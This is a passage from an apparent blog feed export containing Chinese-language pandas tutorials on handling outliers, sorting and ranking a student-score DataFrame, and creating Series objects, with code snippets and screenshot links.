alt="含有正态分布的DataFrame数据集"></p><p>假设我们认为某列中绝对值大小超过3的是异常值，那么判断异常值就是要找出某列中大小超过3的值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data[np.abs(col)&gt;<span class="number">3</span>]</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220201/%E6%A3%80%E6%B5%8B%E5%BC%82%E5%B8%B8%E5%80%BC2.png" alt="找出某列中大小超过3的值"></p><p>要选出全部含有绝对值大小超过3的行，可以在布尔型DataFrame中使用any()方法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data[(np.abs(data)&gt;<span class="number">3</span>).any(<span class="number">1</span>)]</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220201/%E6%A3%80%E6%B5%8B%E5%BC%82%E5%B8%B8%E4%BD%BF%E7%94%A8any%E6%96%B9%E6%B3%95.png" alt="全部含有绝对值大小超过3的行"></p><h2 id="2、替换异常值"><a href="#2、替换异常值" class="headerlink" title="2、替换异常值"></a>2、替换异常值</h2><p>对于异常值，可以直接替换。<br>如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data[np.abs(data)&gt;<span class="number">3</span>]=np.sign(data)*<span class="number">3</span></span><br></pre></td></tr></table></figure><p>这样就可以将异常值替换为绝对值不大于3的<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220201/%E6%9B%BF%E6%8D%A2%E5%BC%82%E5%B8%B8%E5%80%BC.png" alt="替换异常值"></p><h2 id="3、删除异常值"><a href="#3、删除异常值" class="headerlink" title="3、删除异常值"></a>3、删除异常值</h2><p>删除异常值，可以用pandas的drop()方法，接受参数在特定轴线执行删除一条或多条记录，可通过axis参数设置是按行删除还是按列删除<br>如删除第3列，列索引为2的列中绝对值&gt;3的行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">col=data[<span class="number">2</span>]</span><br><span class="line">data.drop(data[np.abs(col)&gt;<span class="number">3</span>].index,inplace=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220201/%E5%88%A0%E9%99%A4%E5%BC%82%E5%B8%B8%E5%80%BC.png" alt="删除异常值"></p><p>可以看到本来有1000行的，删除了3行，再用data[np.abs(col)&gt;3]验证，已经找不到数据了。</p><p>至此，本文通过实例介绍了pandas进行数据清洗包括缺失值、重复值及异常值的处理。数据清洗是数据分析前面的准备工作，数据质量的好坏将直接影响数据分析的结果。</p><hr><p>作者博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pandas数据分析之排序和排名(sort和rank)</title>
      <link href="/posts/16c9fc17/"/>
      <url>/posts/16c9fc17/</url>
      
        <content type="html"><![CDATA[<p>对数据集进行排序和排名的是常用最基础的数据分析手段，pandas提供了方便的排序和排名的方法，通过简单的语句和参数就可以实现常用的排序和排名。</p><p>本文以student数据集的DataFrame为例来演示和介绍pandas数据分析之排序和排名(sort和rank)。<br>数据集内容如下，包括学生的学号、姓名、年龄及语文、数学、英语的成绩：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">df = pd.read_excel(<span class="string">'D:\\Python\\study\\pythontest\\pandastest\\数据集\\student.xlsx'</span>)</span><br><span class="line">df</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220130/student%E6%95%B0%E6%8D%AE%E9%9B%86.png" alt="student数据集"><br>数据集及源代码见：<a href="https://github.com/xiejava1018/pandastest.git" target="_blank" rel="noopener">https://github.com/xiejava1018/pandastest.git</a></p><h1 id="一、排序"><a href="#一、排序" class="headerlink" title="一、排序"></a>一、排序</h1><p>对数据集进行排序是是常用的数据分析需求之一。pandas提供了按 索引标签排序sort_index()和按值排序sort_values()两种排序方法。对于DataFrame，可以根据任意一个轴上的索引标签进行排序。默认顺序排序，也可以设置按倒序排序。</p><h2 id="1、按标签排序"><a href="#1、按标签排序" class="headerlink" title="1、按标签排序"></a>1、按标签排序</h2><h3 id="1）按行标签索引排序"><a href="#1）按行标签索引排序" class="headerlink" title="1）按行标签索引排序"></a>1）按行标签索引排序</h3><p>pandas默认按行标签索引顺序排序</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#按行索引排序</span></span><br><span class="line">df.sort_index()</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220130/%E8%A1%8C%E7%B4%A2%E5%BC%95%E6%8E%92%E5%BA%8F.png" alt="按行索引排序"><br>可以通过设置<code>ascending=False</code>参数进行倒序排序</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#按行索引倒序排序</span></span><br><span class="line">df.sort_index(ascending=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220130/%E8%A1%8C%E7%B4%A2%E5%BC%95%E5%80%92%E5%BA%8F%E6%8E%92%E5%BA%8F.png" alt="按行索引倒序排序"></p><h3 id="2）按列标签索引排序"><a href="#2）按列标签索引排序" class="headerlink" title="2）按列标签索引排序"></a>2）按列标签索引排序</h3><p>通过给 axis 轴参数传递 0 或 1，可以对列标签进行排序。默认情况下，axis=0 表示按行排序；而 axis=1 则表示按列排序。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#按列索引排序</span></span><br><span class="line">df.sort_index(axis=<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220130/%E5%88%97%E7%B4%A2%E5%BC%95%E6%8E%92%E5%BA%8F.png" alt="按列索引排序"><br>同样可以设置ascending=False参数进行倒序排序</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#按列索引倒序排序</span></span><br><span class="line">df.sort_index(axis=<span class="number">1</span>,ascending=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220130/%E5%88%97%E7%B4%A2%E5%BC%95%E5%80%92%E5%BA%8F%E6%8E%92%E5%BA%8F.png" alt="按列索引倒序排序"></p><h2 id="2、按值排序"><a href="#2、按值排序" class="headerlink" title="2、按值排序"></a>2、按值排序</h2><p>在实际应用中用得最多的应该是根据某一列的值进行排序。在pandas中可以通过sort_value()，在sort_value中可以设定按某个列排序，也可以通过sort_value(by=[])，通过设置by=[‘a’,’b’]列表来指定多个需要排序的列。</p><h3 id="1）对单个列的值排序"><a href="#1）对单个列的值排序" class="headerlink" title="1）对单个列的值排序"></a>1）对单个列的值排序</h3><p>如在数据集中对语文成绩进行排序。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#按语文成绩排序</span></span><br><span class="line">df.sort_values(<span class="string">'4-语文'</span>)</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220130/%E5%80%BC%E6%8E%92%E5%BA%8F.png" alt="对语文成绩进行排序"></p><h3 id="2）对多个列的值进行排序"><a href="#2）对多个列的值进行排序" class="headerlink" title="2）对多个列的值进行排序"></a>2）对多个列的值进行排序</h3><p>通过设置by=[‘a’,’b’]列表来指定多个需要排序的列。<br>如对数据集中的语文和数学进行排序</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#按语文、数学排序</span></span><br><span class="line">df.sort_values(by=[<span class="string">'4-语文'</span>,<span class="string">'5-数学'</span>])</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220130/%E5%A4%9A%E4%B8%AA%E5%88%97%E7%9A%84%E5%80%BC%E6%8E%92%E5%BA%8F.png" alt="对数据集中的语文和数学进行排序"></p><h2 id="3、排序算法"><a href="#3、排序算法" class="headerlink" title="3、排序算法"></a>3、排序算法</h2><p>sort_values() 提供了参数kind用来指定排序算法。这里有三种排序算法：</p><ul><li>mergesort（归并排序） </li><li>heapsort（堆排序） </li><li>quicksort（快速排序）</li></ul><p>默认为 quicksort(快速排序) ，其中 mergesort归并排序是最稳定的算法。<br>具体用法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#按语文、数学用mergesort归并排序算法排序</span></span><br><span class="line">df.sort_values(by=[<span class="string">'4-语文'</span>,<span class="string">'5-数学'</span>],kind=<span class="string">'mergesort'</span>)</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220130/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95.png" alt="排序算法"></p><h1 id="二、排名"><a href="#二、排名" class="headerlink" title="二、排名"></a>二、排名</h1><p>排名和排序的区别在于排序一定是有顺序，而排名分先后并列。如在现实生活中相同的分数存在排名并列的情况。<br>在《使用python进行数据分析》一书中对rank排名的描述为：排名是指对数组从1到有效数据点总数分配名次的操作。Series和DataFrame的rank方法是实现排名的方法，默认情况下，rank是通过“为各组分配一个平均排名”的方式破坏平级关系。这段话讲得是什么鬼？其实就是在存在并列排名的时候采用一定的策略来打破这种关系。<br>排名中的平级关系打破方法有如下几种：</p><table><thead><tr><th>method</th><th>说明</th></tr></thead><tbody><tr><td>average</td><td>默认：在每个组中分配平均排名</td></tr><tr><td>min</td><td>对整个组使用最小排名</td></tr><tr><td>max</td><td>对整个组使用最大排名</td></tr><tr><td>first</td><td>按照值在数据中出现的次序分配排名</td></tr><tr><td>dense</td><td>类似于method=’min’,但组件排名总是加1，而不是一个组中的相等元素的数量</td></tr></tbody></table><p><strong>rank()函数原型：</strong><code>rank(axis=0, method: str = &#39;average&#39;, numeric_only: Union[bool, NoneType] = None, na_option: str = &#39;keep&#39;, ascending: bool = True, pct: bool = False)</code><br>这里method取值可以为’average’，’first’，’min’， ‘max’，’dense’，用来打破排名中的平级关系的。<br>光看这些说明还是比较难理解。下面通过实例来说明：</p><h2 id="1、默认average-排名"><a href="#1、默认average-排名" class="headerlink" title="1、默认average 排名"></a>1、默认average 排名</h2><p>在数据集中我们只取“学号”、“姓名”、“语文”，然后取“语文”的排名，默认average</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">df_rank=df[[<span class="string">'1-学号'</span>,<span class="string">'2-姓名'</span>,<span class="string">'4-语文'</span>]].copy()</span><br><span class="line"><span class="comment">#按语文成绩进行rank的默认排名</span></span><br><span class="line">df_rank[<span class="string">'语文排名'</span>]=df_rank[<span class="string">'4-语文'</span>].rank(ascending=<span class="literal">False</span>)</span><br><span class="line">df_rank.sort_values(by=<span class="string">'语文排名'</span>)</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220130/rank%E6%8E%92%E5%90%8D.png" alt="默认average 排名"></p><p>这个排名很奇怪，97分排名第一没有问题，居然没有第二名，三个96分排名均为3，还有两个90分排名为9.5。这是什么鬼？<br>原来这就是默认的“average”规则,成绩相同时，取顺序排名中所有名次之和除以该成绩的个数，如两个90分的名次为最后两名分别为9名和10名，即(9+10)/2=9.5，三个96分的名次分别为2、3、4 那么排名为（2+3+4)/3=9/3=3</p><h2 id="2、mothod-’min’的排名"><a href="#2、mothod-’min’的排名" class="headerlink" title="2、mothod=’min’的排名"></a>2、mothod=’min’的排名</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#按语文成绩进行min排名</span></span><br><span class="line">df_rank[<span class="string">'语文排名'</span>]=df_rank[<span class="string">'4-语文'</span>].rank(method=<span class="string">'min'</span>,ascending=<span class="literal">False</span>)</span><br><span class="line">df_rank.sort_values(by=<span class="string">'语文排名'</span>)</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220130/rank-min%E6%8E%92%E5%90%8D.png" alt="按语文成绩进行min排名"></p><p>在这个排名中看到有3个并列为2的排名，但没有排名为3、4的，有两个排名为9的，但没有排名为10的。可以看出当method=“min”时，成绩相同的同学，取在顺序排名中最小的那个排名作为该值的排名，张三、王五、顾十三个同学都是96分排名分别为2、3、4，那么当method为min时，取2、3、4的最小的那个作为成绩为96的整体排名即第2名。因为有了三个2名，接下来就从5名开始，5、6、7、8，到了第9名又有两个同分数的取9、10的最小排名为9，所以有两个9名。</p><h2 id="3、mothod-’max’的排名"><a href="#3、mothod-’max’的排名" class="headerlink" title="3、mothod=’max’的排名"></a>3、mothod=’max’的排名</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#按语文成绩进行max排名</span></span><br><span class="line">df_rank[<span class="string">'语文排名'</span>]=df_rank[<span class="string">'4-语文'</span>].rank(method=<span class="string">'max'</span>,ascending=<span class="literal">False</span>)</span><br><span class="line">df_rank.sort_values(by=<span class="string">'语文排名'</span>)</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220130/rank-max%E6%8E%92%E5%90%8D.png" alt="按语文成绩进行max排名"><br>与min相反，成绩相同的同学，排名相同取顺序最大的排名，张三、王五、顾十三个同学都是96分排名分别为2、3、4，那么当method为min时，取2、3、4的最小的那个作为成绩为96的整体排名即第2名。当method为max时，取最大的4作为96分的整体排名，同理90分的取10为90分的整体排名。</p><h2 id="4、mothod-’first’的排名"><a href="#4、mothod-’first’的排名" class="headerlink" title="4、mothod=’first’的排名"></a>4、mothod=’first’的排名</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#按语文成绩进行first排名</span></span><br><span class="line">df_rank[<span class="string">'语文排名'</span>]=df_rank[<span class="string">'4-语文'</span>].rank(method=<span class="string">'first'</span>,ascending=<span class="literal">False</span>)</span><br><span class="line">df_rank.sort_values(by=<span class="string">'语文排名'</span>)</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220130/rank-first%E6%8E%92%E5%90%8D.png" alt="按语文成绩进行first排名"></p><p>first排名很好理解了，有点先到先得的意思，成绩相同，谁的索引排前，谁的排名就靠前，比如张三、王五、顾十 这三个同学都是96分，按理应该是并列第2，但张三的索引比王五和顾十的都靠前，王五的索引比顾十靠前，所以他们的顺序分别为2、3、4，同理陈一、钱七的分数都是90分，但陈一的索引比钱七靠前所以陈一排名为9、钱七排名第10</p><h2 id="5、mothod-’dense’的排名"><a href="#5、mothod-’dense’的排名" class="headerlink" title="5、mothod=’dense’的排名"></a>5、mothod=’dense’的排名</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#按语文成绩进行dense排名</span></span><br><span class="line">df_rank[<span class="string">'语文排名'</span>]=df_rank[<span class="string">'4-语文'</span>].rank(method=<span class="string">'dense'</span>,ascending=<span class="literal">False</span>)</span><br><span class="line">df_rank.sort_values(by=<span class="string">'语文排名'</span>)</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220130/rank-dense%E6%8E%92%E5%90%8D.png" alt="按语文成绩进行dense排名"><br>“dense”: 是密集的意思，也比较好理解，即相同成绩的同学排名相同，其他依次加1即可。可以看到张三、王五、顾十这三位同学都是96分，并列排名第2，后面的加1，即比他们分数稍低的赵六95分排名第3，后面依次。</p><h2 id="6、不同method的排名对比"><a href="#6、不同method的排名对比" class="headerlink" title="6、不同method的排名对比"></a>6、不同method的排名对比</h2><p>最后不同method的排名对比：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#按语文成绩进行rank的默认排名</span></span><br><span class="line">df_rank[<span class="string">'语文排名-average'</span>]=df_rank[<span class="string">'4-语文'</span>].rank(ascending=<span class="literal">False</span>)</span><br><span class="line"><span class="comment">#按语文成绩进行min排名</span></span><br><span class="line">df_rank[<span class="string">'语文排名-min'</span>]=df_rank[<span class="string">'4-语文'</span>].rank(method=<span class="string">'min'</span>,ascending=<span class="literal">False</span>)</span><br><span class="line"><span class="comment">#按语文成绩进行max排名</span></span><br><span class="line">df_rank[<span class="string">'语文排名-max'</span>]=df_rank[<span class="string">'4-语文'</span>].rank(method=<span class="string">'max'</span>,ascending=<span class="literal">False</span>)</span><br><span class="line"><span class="comment">#按语文成绩进行first排名</span></span><br><span class="line">df_rank[<span class="string">'语文排名-first'</span>]=df_rank[<span class="string">'4-语文'</span>].rank(method=<span class="string">'first'</span>,ascending=<span class="literal">False</span>)</span><br><span class="line"><span class="comment">#按语文成绩进行dense排名</span></span><br><span class="line">df_rank[<span class="string">'语文排名-dense'</span>]=df_rank[<span class="string">'4-语文'</span>].rank(method=<span class="string">'dense'</span>,ascending=<span class="literal">False</span>)</span><br><span class="line">df_rank.sort_values(by=<span class="string">'4-语文'</span>,ascending=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220130/rank%E4%B8%8D%E5%90%8Cmethod%E6%8E%92%E5%90%8D%E5%AF%B9%E6%AF%94.png" alt="按语文成绩进行rank的默认排名"></p><p>数据集及源代码见：<a href="https://github.com/xiejava1018/pandastest.git" target="_blank" rel="noopener">https://github.com/xiejava1018/pandastest.git</a></p><hr><p>作者博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pandas数据结构(Series和DataFrame)</title>
      <link href="/posts/531458d5/"/>
      <url>/posts/531458d5/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>无可非议，pandas是Python最强大的数据分析和探索工具之一，因金融数据分析工具而开发，支持类似于SQL语句的模型，可以对数据进行增删改查等操作，支持时间序列分析，也能够灵活的处理缺失的数据。它含有使数据分析工作变得更快更简单的高级数据结构和操作工具。pandas是基于NumPy构建的，让以NumPy为中心的应用变得更加简单。</p><p>这里所说的让pandas变得更快更简单的高级数据结构就是Series和DataFrame。要熟练使用pandas，首先得要熟悉它的这两个主要的数据结构：<strong>Series</strong>和<strong>DateFrame</strong>。</p><p>本文将针对Series和DateFrame，介绍Series和DataFrame数据对象的创建及基于数据对象的基础上对数据进行选择、增加、删除等数据操作。</p><h1 id="一、Series"><a href="#一、Series" class="headerlink" title="一、Series"></a>一、Series</h1><p>Series是一种类似于一维数组对象，它是由一组的数据值value（各种NumPy数据类型）以及一组与之相关的数据标签index（即索引）组成，其中标签与数据值之间是一一对应的关系。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">obj = pd.Series([<span class="string">'陈一'</span>,<span class="string">'周二'</span>,<span class="string">'张三'</span>,<span class="string">'李四'</span>,<span class="string">'王五'</span>,<span class="string">'赵六'</span>,<span class="string">'钱七'</span>,<span class="string">'孙八'</span>,<span class="string">'何九'</span>,<span class="string">'顾十'</span>])</span><br><span class="line">obj</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>    陈一</span><br><span class="line"><span class="number">1</span>    周二</span><br><span class="line"><span class="number">2</span>    张三</span><br><span class="line"><span class="number">3</span>    李四</span><br><span class="line"><span class="number">4</span>    王五</span><br><span class="line"><span class="number">5</span>    赵六</span><br><span class="line"><span class="number">6</span>    钱七</span><br><span class="line"><span class="number">7</span>    孙八</span><br><span class="line"><span class="number">8</span>    何九</span><br><span class="line"><span class="number">9</span>    顾十</span><br><span class="line">dtype: object</span><br></pre></td></tr></table></figure><p>Series的字符串表现形式为：索引在左边，值在右边。由于没有为数据指定索引，于是会自动创建一个0到N-1（N为数据的长度）的整数型索引。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220123/Series%E7%BB%93%E6%9E%84.png" alt="Serires数据结构"></p><p>可以通过Series的values和index属性获取其数组表示形式和索引对象。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220123/%E8%8E%B7%E5%8F%96Serires%E7%9A%84values%E5%92%8Cindex%E5%B1%9E%E6%80%A7.png" alt="通过Series的values和index属性获取其数组表示形式和索引对象"></p><p><strong>可以将Series看成一个定长的有序字典，因为它是索引值到数据值的一个映射。</strong></p><h2 id="1、Series对象创建"><a href="#1、Series对象创建" class="headerlink" title="1、Series对象创建"></a>1、Series对象创建</h2><p>pandas 使用 Series()  函数来创建 Series 对象，通过这个对象可以调用相应的方法和属性，从而达到处理数据的目的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">obj=pd.Series( data, index, dtype, copy)</span><br></pre></td></tr></table></figure><p>参数说明如下：</p><table><thead><tr><th>参数名称</th><th>描述</th></tr></thead><tbody><tr><td>data</td><td>输入的数据，可以是列表、常量、ndarray 数组等。</td></tr><tr><td>index</td><td>索引值必须是惟一的，如果没有传递索引，则默认为 np.arrange(n)。</td></tr><tr><td>dtype</td><td>dtype表示数据类型，如果没有提供，则会自动判断得出。</td></tr><tr><td>copy</td><td>表示对 data 进行拷贝，默认为 False。</td></tr></tbody></table><p>data可以是列表、常量、ndarray数组等，如果数据被存放在一个Python字典dict中，也可以直接通过这个dict来创建Series，如果没有传入索引时会按照字典的键来构造索引；反之，当传递了索引时需要将索引标签与字典中的值一一对应。<br>前面的列子是通过列表来创建的Series，接下来看下通过ndarray和dic来创建Series。</p><h3 id="通过ndarray创建Series"><a href="#通过ndarray创建Series" class="headerlink" title="通过ndarray创建Series"></a>通过ndarray创建Series</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ndarray创建Series</span></span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">data=np.array([<span class="string">'陈一'</span>,<span class="string">'周二'</span>,<span class="string">'张三'</span>,<span class="string">'李四'</span>,<span class="string">'王五'</span>,<span class="string">'赵六'</span>,<span class="string">'钱七'</span>,<span class="string">'孙八'</span>,<span class="string">'何九'</span>,<span class="string">'顾十'</span>])</span><br><span class="line">obj= pd.Series(data)</span><br><span class="line">print(obj)</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>    陈一</span><br><span class="line"><span class="number">1</span>    周二</span><br><span class="line"><span class="number">2</span>    张三</span><br><span class="line"><span class="number">3</span>    李四</span><br><span class="line"><span class="number">4</span>    王五</span><br><span class="line"><span class="number">5</span>    赵六</span><br><span class="line"><span class="number">6</span>    钱七</span><br><span class="line"><span class="number">7</span>    孙八</span><br><span class="line"><span class="number">8</span>    何九</span><br><span class="line"><span class="number">9</span>    顾十</span><br><span class="line">dtype: object</span><br></pre></td></tr></table></figure><h3 id="通过dict创建Series"><a href="#通过dict创建Series" class="headerlink" title="通过dict创建Series"></a>通过dict创建Series</h3><p>#通过dict创建Series,没有设置indx</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">data = &#123;<span class="string">'1'</span> :<span class="string">'张三'</span>, <span class="string">'2'</span> :<span class="string">'李四'</span>, <span class="string">'3'</span> : <span class="string">'王五'</span>&#125;</span><br><span class="line">obj=pd.Series(data)</span><br><span class="line">print(obj)</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>    张三</span><br><span class="line"><span class="number">2</span>    李四</span><br><span class="line"><span class="number">3</span>    王五</span><br><span class="line">dtype: object</span><br></pre></td></tr></table></figure><p>当传递的索引值无法找到与其对应的值时，使用 NaN（非数字）填充。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#通过dict创建Series,设置indx</span></span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">data = &#123;<span class="string">'1'</span> :<span class="string">'张三'</span>, <span class="string">'2'</span> :<span class="string">'李四'</span>, <span class="string">'3'</span> : <span class="string">'王五'</span>&#125;</span><br><span class="line">obj=pd.Series(data,index=[<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'4'</span>])</span><br><span class="line"><span class="comment">#索引4没有在dict的对应的key，所以使用NaN（非数字）填充</span></span><br><span class="line">print(obj)</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>     张三</span><br><span class="line"><span class="number">2</span>     李四</span><br><span class="line"><span class="number">4</span>    NaN</span><br><span class="line">dtype: object</span><br></pre></td></tr></table></figure><h2 id="2、Series操作"><a href="#2、Series操作" class="headerlink" title="2、Series操作"></a>2、Series操作</h2><h3 id="Series数据访问"><a href="#Series数据访问" class="headerlink" title="Series数据访问"></a>Series数据访问</h3><p>Series提供了多种数据访问的方式，可以通过位置下标及索引来访问数据，可以访问单个数据也可以访问多个数据。</p><h4 id="通过位置下标及索引来访问数据"><a href="#通过位置下标及索引来访问数据" class="headerlink" title="通过位置下标及索引来访问数据"></a>通过位置下标及索引来访问数据</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 